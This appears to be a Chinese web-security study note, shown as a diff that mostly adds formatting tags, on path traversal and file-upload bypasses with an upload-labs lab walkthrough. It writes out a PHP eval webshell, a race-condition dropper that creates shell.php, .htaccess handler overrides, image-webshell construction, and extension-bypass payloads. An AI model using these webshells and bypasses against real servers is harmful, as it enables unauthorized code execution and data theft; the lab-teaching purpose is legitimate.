 核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
@@ -4109,7 +3808,6 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 2. Pikachu靶场实操
 下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
 利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
-
 
 五、补充文件下载与文件包含原理相近：
 
@@ -4140,33 +3838,33 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 移动端同类上传功能
 
 3. 基础实操
-普通上传：上传图片至up/目录，访问路径http://127.0.0.1/up/xxx.jpg。
+普通上传：上传图片至&lt;font style=&quot;color:#181a1f;&quot;&gt;up/目录，访问路径&lt;font style=&quot;color:#181a1f;&quot;&gt;http://127.0.0.1/up/xxx.jpg。
 恶意上传1（phpinfo）：
-文件名：1.php
-代码：&lt;?php phpinfo(); ?&gt;
-访问：http://localhost/up/1.php，泄露服务器信息。
+文件名：&lt;font style=&quot;color:#181a1f;&quot;&gt;1.php
+代码：&lt;font style=&quot;color:#181a1f;&quot;&gt;&lt;?php phpinfo(); ?&gt;
+访问：&lt;font style=&quot;color:#181a1f;&quot;&gt;http://localhost/up/1.php，泄露服务器信息。
 
 
 恶意上传2（一句话木马）：
-文件名：2.php
-代码：&lt;?php @eval($_POST[cmd]); ?&gt;
-访问：POST传参cmd=phpinfo();，执行任意代码。
+文件名：&lt;font style=&quot;color:#181a1f;&quot;&gt;2.php
+代码：&lt;font style=&quot;color:#181a1f;&quot;&gt;&lt;?php @eval($_POST[cmd]); ?&gt;
+访问：POST传参&lt;font style=&quot;color:#181a1f;&quot;&gt;cmd=phpinfo();，执行任意代码。
 
 
 
 4. 一句话木马解析
-@：抑制错误，保证代码执行。
-eval()：将字符串当作PHP代码执行。
-$_POST[cmd]：接收POST请求中cmd参数的命令并执行。
+&lt;font style=&quot;color:#181a1f;&quot;&gt;@：抑制错误，保证代码执行。
+&lt;font style=&quot;color:#181a1f;&quot;&gt;eval()：将字符串当作PHP代码执行。
+&lt;font style=&quot;color:#181a1f;&quot;&gt;$_POST[cmd]：接收POST请求中&lt;font style=&quot;color:#181a1f;&quot;&gt;cmd参数的命令并执行。
 
 5. 蚁剑连接一句话木马
-URL：http://localhost/up/2.php
-连接密码：cmd
+URL：&lt;font style=&quot;color:#181a1f;&quot;&gt;http://localhost/up/2.php
+连接密码：&lt;font style=&quot;color:#181a1f;&quot;&gt;cmd
 效果：获取服务器目录权限，可编辑、删除文件，执行系统命令。
 
 
 二、文件上传检测绕过1. JS前端验证绕过
-原理：网站仅在浏览器端使用 JavaScript 检查文件后缀（例如：allowSubmit() 函数限制只能上传 .jpg&#x2F;.png）。
+原理：网站仅在浏览器端使用 JavaScript 检查文件后缀（例如：&lt;font style=&quot;color:#181a1f;&quot;&gt;allowSubmit() 函数限制只能上传 &lt;font style=&quot;color:#181a1f;&quot;&gt;.jpg&#x2F;&lt;font style=&quot;color:#181a1f;&quot;&gt;.png）。
 绕过方法：
 方法一：
 保存网页到本地。
@@ -4183,15 +3881,15 @@ URL：http://localhost/up/2.php
 
 
 2. MIME类型验证绕过
-原理：后端代码通过检查 HTTP 请求头中的 Content-Type 字段来判断文件类型（例如要求必须是 image/jpeg）。
-绕过方法：BurpSuite抓包，修改Content-Type为图片类型。
+原理：后端代码通过检查 HTTP 请求头中的 &lt;font style=&quot;color:#181a1f;&quot;&gt;Content-Type 字段来判断文件类型（例如要求必须是 &lt;font style=&quot;color:#181a1f;&quot;&gt;image/jpeg）。
+绕过方法：BurpSuite抓包，修改&lt;font style=&quot;color:#181a1f;&quot;&gt;Content-Type为图片类型。
 
 3. 黑名单后缀绕过
-原理：后端设置了一个“不允许上传的文件后缀”列表（如禁止 .php, .asp）。如果遇到粗心的管理员，黑名单可能会漏掉一些同样能被解析的替代后缀。
+原理：后端设置了一个“不允许上传的文件后缀”列表（如禁止 &lt;font style=&quot;color:#181a1f;&quot;&gt;.php, &lt;font style=&quot;color:#181a1f;&quot;&gt;.asp）。如果遇到粗心的管理员，黑名单可能会漏掉一些同样能被解析的替代后缀。
 绕过方法：尝试使用黑名单之外但可能被服务器解析的后缀。
-PHP 环境：.php3, .php4, .php5, .phtml, .phtm
-ASP 环境：.asa, .cer, .cdx
-JSP 环境：.jspx, .jsv, .jsw
+PHP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.php3, &lt;font style=&quot;color:#181a1f;&quot;&gt;.php4, &lt;font style=&quot;color:#181a1f;&quot;&gt;.php5, &lt;font style=&quot;color:#181a1f;&quot;&gt;.phtml, &lt;font style=&quot;color:#181a1f;&quot;&gt;.phtm
+ASP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.asa, &lt;font style=&quot;color:#181a1f;&quot;&gt;.cer, &lt;font style=&quot;color:#181a1f;&quot;&gt;.cdx
+JSP 环境：&lt;font style=&quot;color:#181a1f;&quot;&gt;.jspx, &lt;font style=&quot;color:#181a1f;&quot;&gt;.jsv, &lt;font style=&quot;color:#181a1f;&quot;&gt;.jsw
 
 
 
@@ -4201,47 +3899,47 @@ JSP 环境：.jspx, .jsv, .jsw
 
 &lt;FilesMatch &quot;2.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
 
-1. 上传`.htaccess`文件，内容：
-2. 上传名为`loudong.jpg`的PHP木马，自动解析为PHP。
+1. &lt;font style=&quot;color:#181a1f;&quot;&gt;上传`&lt;font style=&quot;color:#181a1f;&quot;&gt;.htaccess`&lt;font style=&quot;color:#181a1f;&quot;&gt;文件，内容：
+2. &lt;font style=&quot;color:#181a1f;&quot;&gt;上传名为`&lt;font style=&quot;color:#181a1f;&quot;&gt;loudong.jpg`&lt;font style=&quot;color:#181a1f;&quot;&gt;的PHP木马，自动解析为PHP。
 
 5. 大小写绕过
-原理：后端在写黑名单校验时，忘记使用类似 strtolower() 的函数将文件名统一转为小写。
-绕过方法：文件名改为info.PHP&#x2F;info.PhP。
+原理：后端在写黑名单校验时，忘记使用类似 &lt;font style=&quot;color:#181a1f;&quot;&gt;strtolower() 的函数将文件名统一转为小写。
+绕过方法：文件名改为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.PHP&#x2F;&lt;font style=&quot;color:#181a1f;&quot;&gt;info.PhP。
 
 6. 末尾空格绕过
-原理：代码在黑名单对比时，没有对文件名进行去空格处理（未调用 trim() 函数）。
-绕过方法：Burp修改文件名为info.php （末尾加空格）。
+原理：代码在黑名单对比时，没有对文件名进行去空格处理（未调用 &lt;font style=&quot;color:#181a1f;&quot;&gt;trim() 函数）。
+绕过方法：Burp修改文件名为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php （末尾加空格）。
 
 7. 末尾点绕过
-原理：代码在黑名单对比时，没有循环利用 deldot() 去除文件名末尾的点。
-绕过方法：Burp修改文件名为info.php.。
+原理：代码在黑名单对比时，没有循环利用 &lt;font style=&quot;color:#181a1f;&quot;&gt;deldot() 去除文件名末尾的点。
+绕过方法：Burp修改文件名为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php.。
 
 8. Windows ::$DATA绕过
-原理：在 Windows 的 NTFS 文件系统中，包含一种称为NTFS 交换数据流（ADS）的特性。任何文件在后面加上 ::$DATA 都会被当做文件流处理，而不会改变文件本身的属性。
-绕过方法：抓包修改文件名为 webshell.php::$DATA。后端的黑名单通常无法匹配这种后缀而放行，但 Windows 在写入磁盘时，会把 ::$DATA 之后的内容去掉，最终安全落地为 webshell.php。
+原理：在 Windows 的 NTFS 文件系统中，包含一种称为NTFS 交换数据流（ADS）的特性。任何文件在后面加上 &lt;font style=&quot;color:#181a1f;&quot;&gt;::$DATA 都会被当做文件流处理，而不会改变文件本身的属性。
+绕过方法：抓包修改文件名为 &lt;font style=&quot;color:#181a1f;&quot;&gt;webshell.php::$DATA。后端的黑名单通常无法匹配这种后缀而放行，但 Windows 在写入磁盘时，会把 &lt;font style=&quot;color:#181a1f;&quot;&gt;::$DATA 之后的内容去掉，最终安全落地为 &lt;font style=&quot;color:#181a1f;&quot;&gt;webshell.php。
 
 9. 点+空格绕过
-原理：这是由于后端代码逻辑漏洞导致的复合绕过。例如代码只利用 deldot() 或 trim() 处理了一次，由于顺序问题，没有清理干净。deldot函数仅从末尾删点，遇空格停止。
-绕过方法：文件名改为info.php. .（点+空格+点）。
+原理：这是由于后端代码逻辑漏洞导致的复合绕过。例如代码只利用 &lt;font style=&quot;color:#181a1f;&quot;&gt;deldot() 或 &lt;font style=&quot;color:#181a1f;&quot;&gt;trim() 处理了一次，由于顺序问题，没有清理干净。&lt;font style=&quot;color:#181a1f;&quot;&gt;deldot函数仅从末尾删点，遇空格停止。
+绕过方法：文件名改为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php. .（点+空格+点）。
 
 10. 双写后缀绕过
-原理：后端采用了“黑名单替换”的防御策略，即发现敏感后缀（如 php）就直接将其替换为空字符串（str_replace(&#39;php&#39;, &#39;&#39;, $filename)），但由于只替换了一次，引发了漏洞。
-绕过方法：文件名改为info.pphphp（替换后变为info.php）。
+原理：后端采用了“黑名单替换”的防御策略，即发现敏感后缀（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;php）就直接将其替换为空字符串（&lt;font style=&quot;color:#181a1f;&quot;&gt;str_replace(&#39;php&#39;, &#39;&#39;, $filename)），但由于只替换了一次，引发了漏洞。
+绕过方法：文件名改为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.pphphp（替换后变为&lt;font style=&quot;color:#181a1f;&quot;&gt;info.php）。
 
 11. 0x00 截断绕过
-原理：在底层 C&#x2F;C++ 语言中，0x00（十六进制的 00，即 URL 编码的 %00）被视为字符串的结束标识符。当 PHP 版本 &lt; 5.3.4 且 magic_quotes_gpc = Off 时，如果在拼接文件保存路径时注入了 0x00，底层函数在读取到 0x00 时会认为路径已结束，从而截断后面的合法后缀。
+原理：在底层 C&#x2F;C++ 语言中，&lt;font style=&quot;color:#181a1f;&quot;&gt;0x00（十六进制的 &lt;font style=&quot;color:#181a1f;&quot;&gt;00，即 URL 编码的 &lt;font style=&quot;color:#181a1f;&quot;&gt;%00）被视为字符串的结束标识符。当 PHP 版本 &lt;font style=&quot;color:#181a1f;&quot;&gt;&lt; 5.3.4 且 &lt;font style=&quot;color:#181a1f;&quot;&gt;magic_quotes_gpc = Off 时，如果在拼接文件保存路径时注入了 &lt;font style=&quot;color:#181a1f;&quot;&gt;0x00，底层函数在读取到 &lt;font style=&quot;color:#181a1f;&quot;&gt;0x00 时会认为路径已结束，从而截断后面的合法后缀。
 绕过方法：
-GET 传参：如果上传路径拼接在 URL 中，直接在路径后加上 %00。例如 save_path=../upload/shell.php%00。
-POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST 不会自动 URL 解码，需要在 Burp Suite 中输入一个占位符（如 shell.php+），然后在 Hex（十六进制）视图中，将 + 对应的十六进制值（2b）修改为 00。
+GET 传参：如果上传路径拼接在 URL 中，直接在路径后加上 &lt;font style=&quot;color:#181a1f;&quot;&gt;%00。例如 &lt;font style=&quot;color:#181a1f;&quot;&gt;save_path=../upload/shell.php%00。
+POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST 不会自动 URL 解码，需要在 Burp Suite 中输入一个占位符（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php+），然后在 Hex（十六进制）视图中，将 &lt;font style=&quot;color:#181a1f;&quot;&gt;+ 对应的十六进制值（&lt;font style=&quot;color:#181a1f;&quot;&gt;2b）修改为 &lt;font style=&quot;color:#181a1f;&quot;&gt;00。
 
 
 
 12. 图片马 + 文件包含绕过
-原理：后端不再只校验后缀，而是深入检查文件内容。例如读取文件头部前几个字节（Magic Bytes）来判断是否为真实图片，或者调用 getimagesize()、exif_imagetype() 函数验证图片合法性。
+原理：后端不再只校验后缀，而是深入检查文件内容。例如读取文件头部前几个字节（Magic Bytes）来判断是否为真实图片，或者调用 &lt;font style=&quot;color:#181a1f;&quot;&gt;getimagesize()、&lt;font style=&quot;color:#181a1f;&quot;&gt;exif_imagetype() 函数验证图片合法性。
 绕过方法：
-制作图片马：在 Windows 命令行下，使用命令 copy 原图.png /b + 木马.php /a 生成图.png，将恶意代码隐藏在合法图片数据的尾部。
+制作图片马：在 Windows 命令行下，使用命令 &lt;font style=&quot;color:#181a1f;&quot;&gt;copy 原图.png /b + 木马.php /a 生成图.png，将恶意代码隐藏在合法图片数据的尾部。
 上传成功后，该文件在服务器端依然是一张图片，无法直接解析。
-必须配合文件包含漏洞（如服务器存在 include($_GET[&#39;file&#39;]) 逻辑），将上传的图片路径传入包含函数中，强制服务器按 PHP 语法解析该图片，从而触发木马。
+必须配合文件包含漏洞（如服务器存在 &lt;font style=&quot;color:#181a1f;&quot;&gt;include($_GET[&#39;file&#39;]) 逻辑），将上传的图片路径传入包含函数中，强制服务器按 PHP 语法解析该图片，从而触发木马。
 
 
 
@@ -4256,39 +3954,42 @@ POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST �
 将 PHP 一句话木马插入到这些不发生变化的区域，重新上传即可。
 
 14. 条件竞争绕过
-原理：后端代码存在逻辑时间差（TOCTOU 漏洞）。服务器的流程是：先将文件移动到上传目录 -&gt; 然后判断是否合法 -&gt; 若不合法则调用 unlink() 删除文件。在”判断并删除”的这段极短时间里，文件是真实存在于服务器上的。
+原理：后端代码存在逻辑时间差（TOCTOU 漏洞）。服务器的流程是：先将文件移动到上传目录 -&gt; 然后判断是否合法 -&gt; 若不合法则调用 &lt;font style=&quot;color:#181a1f;&quot;&gt;unlink() 删除文件。在“判断并删除”的这段极短时间里，文件是真实存在于服务器上的。
 绕过方法：
 
 
-准备一个能生成新文件的木马（例如：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;）。
+准备一个能生成新文件的木马（例如：&lt;font style=&quot;color:#181a1f;&quot;&gt;&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);?&gt;）。
 使用抓包工具（如 Burp Suite 的 Intruder）开启大线程，疯狂且持续地上传该木马。
 同时开启另一个工具，疯狂且持续地请求访问该木马的 URL。
-只要在服务器删除它的瞬间之前，有一次 HTTP 请求成功访问到了该文件，木马就会执行，并在服务器上生成一个新的、永远不会被删除的 shell.php。
+只要在服务器删除它的瞬间之前，有一次 HTTP 请求成功访问到了该文件，木马就会执行，并在服务器上生成一个新的、永远不会被删除的 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php。
 
 15. 白名单 + 数组绕过
-原理：开发者允许用户以数组形式（如 save_name[]）提交文件名，并在后端根据数组索引来拼接最终的文件名。如果代码逻辑中使用了 count() 函数获取数组长度，但拼接时却写死了索引（如 $save_name[0] . &#39;.&#39; . $save_name[count-1]），就会产生逻辑漏洞。
-绕过方法：抓包修改请求，构造一个不连续的数组：save_name[0]=shell.php，save_name[2]=jpg。此时数组长度 count 为 2。拼接时取 $save_name[0] (shell.php) 和 $save_name[1] (由于跳过了1，为空)，最终保存的文件名变成了 shell.php.，利用 Windows 特性去除末尾点，落地为 PHP。
+原理：开发者允许用户以数组形式（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;save_name[]）提交文件名，并在后端根据数组索引来拼接最终的文件名。如果代码逻辑中使用了 &lt;font style=&quot;color:#181a1f;&quot;&gt;count() 函数获取数组长度，但拼接时却写死了索引（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;$save_name[0] . &#39;.&#39; . $save_name[count-1]），就会产生逻辑漏洞。
+绕过方法：抓包修改请求，构造一个不连续的数组：&lt;font style=&quot;color:#181a1f;&quot;&gt;save_name[0]=shell.php，&lt;font style=&quot;color:#181a1f;&quot;&gt;save_name[2]=jpg。此时数组长度 &lt;font style=&quot;color:#181a1f;&quot;&gt;count 为 2。拼接时取 &lt;font style=&quot;color:#181a1f;&quot;&gt;$save_name[0] (shell.php) 和 &lt;font style=&quot;color:#181a1f;&quot;&gt;$save_name[1] (由于跳过了1，为空)，最终保存的文件名变成了 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php.，利用 Windows 特性去除末尾点，落地为 PHP。
+
+
+
 
 16. 中间件解析漏洞原理与绕过
 IIS 6.0 解析漏洞：
-目录解析原理：IIS 会将以 .asp 命名的文件夹（如 /test.asp/）下的所有文件都当成 ASP 脚本解析。
-绕过方法：如果可以控制上传目录名，建立 .asp 目录，将图片马传进去即可执行。
-分号解析原理：IIS 在解析文件名时，遇到 ; 会将其后面的内容截断。
-绕过方法：上传名为 shell.asp;.jpg 的文件，过白名单是 .jpg，但 IIS 会当做 shell.asp 解析。
+目录解析原理：IIS 会将以 &lt;font style=&quot;color:#181a1f;&quot;&gt;.asp 命名的文件夹（如 &lt;font style=&quot;color:#181a1f;&quot;&gt;/test.asp/）下的所有文件都当成 ASP 脚本解析。
+绕过方法：如果可以控制上传目录名，建立 &lt;font style=&quot;color:#181a1f;&quot;&gt;.asp 目录，将图片马传进去即可执行。
+分号解析原理：IIS 在解析文件名时，遇到 &lt;font style=&quot;color:#181a1f;&quot;&gt;; 会将其后面的内容截断。
+绕过方法：上传名为 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.asp;.jpg 的文件，过白名单是 &lt;font style=&quot;color:#181a1f;&quot;&gt;.jpg，但 IIS 会当做 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.asp 解析。
 Apache 多后缀解析漏洞：
 原理：Apache 的解析规则是从右向左。遇到不认识的后缀，会继续往左读取，直到遇到认识的为止。
-绕过方法：上传名为 shell.php.a.b.c 的文件。Apache 不认识 .c, .b, .a，最终会识别到 .php 并执行。
+绕过方法：上传名为 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.php.a.b.c 的文件。Apache 不认识 &lt;font style=&quot;color:#181a1f;&quot;&gt;.c, &lt;font style=&quot;color:#181a1f;&quot;&gt;.b, &lt;font style=&quot;color:#181a1f;&quot;&gt;.a，最终会识别到 &lt;font style=&quot;color:#181a1f;&quot;&gt;.php 并执行。
 Nginx 解析漏洞 (CGI-PHP)：
-原理：当 PHP 的 cgi.fix_pathinfo=1 时开启。Nginx 遇到请求 shell.jpg/.php 时，找不到该文件，会将路径交给 PHP 处理。PHP 会向上解析，发现 shell.jpg 存在，就把它当成 PHP 执行了。
-绕过方法：上传正常的图片马 shell.jpg。然后在浏览器中访问 http://xxx/shell.jpg/.php，即可触发执行。
+原理：当 PHP 的 &lt;font style=&quot;color:#181a1f;&quot;&gt;cgi.fix_pathinfo=1 时开启。Nginx 遇到请求 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.jpg/.php 时，找不到该文件，会将路径交给 PHP 处理。PHP 会向上解析，发现 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.jpg 存在，就把它当成 PHP 执行了。
+绕过方法：上传正常的图片马 &lt;font style=&quot;color:#181a1f;&quot;&gt;shell.jpg。然后在浏览器中访问 &lt;font style=&quot;color:#181a1f;&quot;&gt;http://xxx/shell.jpg/.php，即可触发执行。
 
 
 三、案例分析练习靶场：https://github.com/c0ny1/upload-labs
 上传的文件用到的一句话木马都是：
 &lt;?php  phpinfo();?&gt;
 
-Pass-01-前端校验1、题目
 
+Pass-01-前端校验1、题目
 function checkFile() &#123;    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;    if (file == null || file == &quot;&quot;) &#123;        alert(&quot;请选择要上传的文件!&quot;);        return false;    &#125;    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    &#125;&#125;
 
 2、解题思路
@@ -4300,16 +4001,12 @@ function checkFile() &#123;    var file = document.getElementsByName(&#x27;uploa
 
 
 
-
 重新上传 1.png，再修改为 1.php
 
 
 
 
-
-
 放行
-
 
 
 
@@ -4318,12 +4015,10 @@ function checkFile() &#123;    var file = document.getElementsByName(&#x27;uploa
 
 
 Pass-02-MIME 欺骗1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
 分析代码
-
 
 
  MIME 欺骗  
@@ -4332,14 +4027,11 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 
 
 
-
 修改 Content-Type 里的内容，绕过校验。可以改成 image&#x2F;gif、image&#x2F;jpeg、image&#x2F;png。
 
 
 
-
 放行
-
 
 
 
@@ -4350,12 +4042,10 @@ http://127.0.0.1/upload/1.php
 
 
 Pass-03-phtml1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) &#123;                 $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
 分析代码
-
 
 
 
@@ -4366,16 +4056,12 @@ str_ireplace(&#39;::$DATA&#39;, ...) 擦除 Windows 的 NTFS 流特征
 trim() 首尾去空格
 
  apache服务器能够使⽤php解析.phtml.php5， 使用 .phtml 或 .php5 后缀  
-但是这关不可以用1.php. .  因为代码强制重命名，使用了时间戳 date() 保存。上传1.php. .  后又抓到这个包
+但是这关不可以用**1.php. . ** 因为代码强制重命名，使用了时间戳 date() 保存。上传**1.php. . ** 后又抓到这个包
 
-
-这就是我们上传的1.php. .  ，被改名了
-
-
+这就是我们上传的**1.php. . ** ，被改名了
 
 
 复制地址访问：
-
 
 也不可以传 .htaccess 配置文件 ，虽然.htaccess 不在它的黑名单（.asp, .aspx, .php, .jsp）里，但是会被重命名， Apache 服务器它只认名字确切为 .htaccess 的文件。
 3、操作
@@ -4383,10 +4069,7 @@ trim() 首尾去空格
 
 
 
-
 上传 phtml 为后缀的文件
-
-
 
 
 
@@ -4398,7 +4081,6 @@ http://127.0.0.1/upload/202606052009002725.phtml
 
 
 Pass-04-.htaccess配置文件1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传!&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
@@ -4409,30 +4091,29 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 黑名单里不存在.htaccess
 
 
-
 deldot() 删掉末尾的点
 strrchr() 截取最后一个点后面的后缀
 strtolower() 强制转小写
 str_ireplace(&#39;::$DATA&#39;, ...) 擦除 Windows 的 NTFS 流特征
 trim() 首尾去空格
 
-可以上传一个1.php. .  (点 + 空格 + 点 + 空格)  
+可以上传一个**1.php. . ** (点 + 空格 + 点 + 空格)  
 末尾只有一个空格，绕过了 deldot() 函数的操作,$file_name 依然是：1.php. . ；
-strrchr() 截取后缀，从右往左找最后一个点，截取了 .  （一个点 + 一个空格）, 新变量 $file_ext &#x3D; . 
+strrchr() 截取后缀，从右往左找最后一个点，截取了 .  （一个点 + 一个空格）, 新变量 $file_ext &#x3D; **. **
 trim() 它把 $file_ext 里的那个空格削掉了。 此时 $file_ext 变成了 . （只有一个点）。  
- 代码拿 . 去对比黑名单，发现不在里面。绕过校验！
+ 代码拿 **.** 去对比黑名单，发现不在里面。绕过校验！
 3、操作方法一：.htaccess配置文件条件：服务器是 apache、
 知识补充：
-在 Apache 环境下，.htaccess写入内容：
+在 Apache 环境下，&lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;.htaccess写入内容：
 AddType application/x-httpd-php .jpg
 
 
-核心原理：AddType 指令用于在给定的文件扩展名与特定的内容类型（MIME type）之间建立映射。这行内容直接命令 Apache：“从现在开始，只要在这个目录下看到以 .jpg 结尾的文件，不需要管它的二进制内容，统统把它当做 application/x-httpd-php（即 PHP 脚本）交给 PHP 引擎去解析执行。”
+核心原理：&lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;AddType 指令用于在给定的文件扩展名与特定的内容类型（MIME type）之间建立映射。这行内容直接命令 Apache：“从现在开始，只要在这个目录下看到以 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;.jpg 结尾的文件，不需要管它的二进制内容，统统把它当做 &lt;font style=&quot;color:rgba(0, 0, 0, 0.55);&quot;&gt;application/x-httpd-php（即 PHP 脚本）交给 PHP 引擎去解析执行。”
 
 &lt;FilesMatch &quot;webshell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;
 
 
-核心原理：&lt;FilesMatch&gt; 使用正则表达式来匹配文件名，而 SetHandler 用于强制指定匹配文件的处理器。这行内容的意思是：“只有当当前目录下的文件名精确叫做 webshell.jpg 时，才激活 PHP 处理器去执行它。” 这种方式隐蔽性极高，不会影响该目录下其他正常图片的显示。
